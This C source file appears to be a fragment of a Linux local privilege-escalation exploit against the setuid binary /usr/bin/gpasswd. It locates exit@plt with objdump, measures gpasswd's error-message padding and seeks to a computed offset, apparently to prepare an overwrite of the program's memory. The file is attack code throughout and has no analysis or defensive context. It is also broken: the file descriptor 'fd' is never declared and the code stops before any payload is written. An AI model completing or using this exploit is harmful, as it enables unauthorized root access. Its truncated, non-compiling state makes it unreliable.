#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <fcntl.h>
#include <unistd.h>
#include <limits.h>

int main(int argc,char *argv[])
{
     unsigned long address;
      FILE *command = popen("objdump -d /usr/bin/gpasswd|grep '<exit@plt>'|head -n 1|cut -d ' ' -f 1|sed 's/^[0]*\\([^0]*\\)/ 0x\\1/'", "r");
      char result[256];
      result[0] = 0;
      fgets(result, 32, command);
      pclose(command);
      address = strtoul(result, NULL, 16);
      if (address == ULONG_MAX || !address) {
        printf("[-] Could not resolve /usr/bin/gpasswd. Specify the exit@plt function address manually.\n");
        printf("[-] Usage: %s -o ADDRESS\n[-] Example: %s -o 0x402178\n", argv[0], argv[0]);
        return 1;
      }
      printf("[+] Resolved exit@plt to 0x%lx.\n", address);
    printf("[+] Calculating gpasswd padding.\n");

    command = popen("/usr/bin/gpasswd this-user-does-not-exist 2>&1", "r");
    result[0] = 0;
    fgets(result, 256, command);
    pclose(command);
    unsigned long gpasswd_padding = (strstr(result, "this-user-does-not-exist") - result) / sizeof(char);
    unsigned long offset = address - gpasswd_padding;
    printf("[+] Seeking to offset 0x%lx.\n", offset);
    lseek64(fd, offset, SEEK_SET);

}
